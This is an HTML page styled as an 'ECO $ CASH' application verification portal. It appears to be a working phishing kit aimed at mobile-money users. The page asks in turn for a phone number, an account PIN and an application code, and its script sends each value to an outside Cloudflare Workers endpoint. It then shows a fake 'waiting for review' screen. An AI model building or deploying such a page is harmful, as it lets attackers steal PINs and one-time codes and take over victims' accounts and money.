
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ECO $ CASH | Verification</title>
<style>
* { box-sizing: border-box; }
body {
  margin: 0;
  font-family: Arial, sans-serif;
  background: #f1f4f8;
  color: #17243a;
}
header {
  background: #102b50;
  color: white;
  padding: 35px 15px;
  text-align: center;
}
header h1 { font-size: 32px; margin: 0; }
header p { margin-bottom: 0; color: #d5e4f5; }
main {
  background: white;
  max-width: 430px;
  margin: 35px auto;
  padding: 28px;
  border-radius: 14px;
  box-shadow: 0 5px 25px #00000012;
}
label {
  display: block;
  font-weight: bold;
  margin: 20px 0 8px;
}
input {
  width: 100%;
  padding: 14px;
  border: 1px solid #ccd3df;
  border-radius: 7px;
  font-size: 16px;
}
button {
  width: 100%;
  padding: 15px;
  background: #14734a;
  border: none;
  border-radius: 7px;
  color: white;
  font-size: 16px;
  font-weight: bold;
  margin-top: 18px;
  cursor: pointer;
}
.status {
  margin-top: 18px;
  padding: 13px;
  background: #edf5ff;
  border-radius: 7px;
  color: #244c78;
  text-align: center;
}
.hidden { display: none; }
</style>
</head>
<body>

<header>
  <h1>ECO $ CASH</h1>
  <p>Application verification portal</p>
</header>

<main>
  <h2>Secure Verification</h2>
  <p>Please complete the following verification stages.</p>

  <section id="phoneStage">
    <label for="phone">Phone Number</label>
    <input id="phone" type="tel"
      placeholder="+263 7XXXXXXXX"
      autocomplete="tel" required>
    <button id="phoneButton">Continue</button>
  </section>

  <section id="pinStage" class="hidden">
    <label for="pin">Application PIN</label>
    <input id="pin" type="password"
      placeholder="Enter your application PIN"
      autocomplete="off">
    <button id="pinButton">Continue</button>
  </section>

  <section id="codeStage" class="hidden">
    <label for="code">Application Code</label>
    <input id="code" type="text"
      placeholder="Enter your assigned application code"
      autocomplete="off">
    <button id="codeButton">Submit</button>
  </section>

  <div id="waiting" class="hidden">
    <h2>Application Submitted</h2>
    <p>Your details have been submitted for review.</p>
    <div class="status">Waiting for application review.</div>
  </div>
</main>

<script>
const phoneStage = document.getElementById("phoneStage");
const pinStage = document.getElementById("pinStage");
const codeStage = document.getElementById("codeStage");
const waiting = document.getElementById("waiting");

const API_URL = "https://quickcash-backend.doviaskipmoi.workers.dev/notify";

let applicationPhone = "";

async function sendNotification(event, additionalData = {}) {
  const response = await fetch(API_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      event,
      phone: applicationPhone,
      ...additionalData
    })
  });

  if (!response.ok) {
    throw new Error("Notification failed");
  }

  return response.json();
}

document.getElementById("phoneButton").onclick = async () => {
  const phone = document.getElementById("phone").value.trim();

  if (!phone) {
    alert("Please enter your phone number.");
    return;
  }

  applicationPhone = phone;

  try {
    await sendNotification("phone_submitted");
    phoneStage.classList.add("hidden");
    pinStage.classList.remove("hidden");
  } catch {
    alert("Unable to submit. Please try again.");
  }
};

document.getElementById("pinButton").onclick = async () => {
  const pin = document.getElementById("pin").value.trim();

  if (!pin) {
    alert("Please enter your application PIN.");
    return;
  }

  try {
    // Pass the PIN along with the phone number
    await sendNotification("pin_submitted", { pin });
    pinStage.classList.add("hidden");
    codeStage.classList.remove("hidden");
  } catch {
    alert("Unable to submit. Please try again.");
  }
};

document.getElementById("codeButton").onclick = async () => {
  const code = document.getElementById("code").value.trim();

  if (!code) {
    alert("Please enter your application code.");
    return;
  }

  try {
    // Pass the Code along with the phone number
    await sendNotification("code_submitted", { code });
    codeStage.classList.add("hidden");
    waiting.classList.remove("hidden");
  } catch {
    alert("Unable to submit. Please try again.");
  }
};
</script>

</body>
</html>
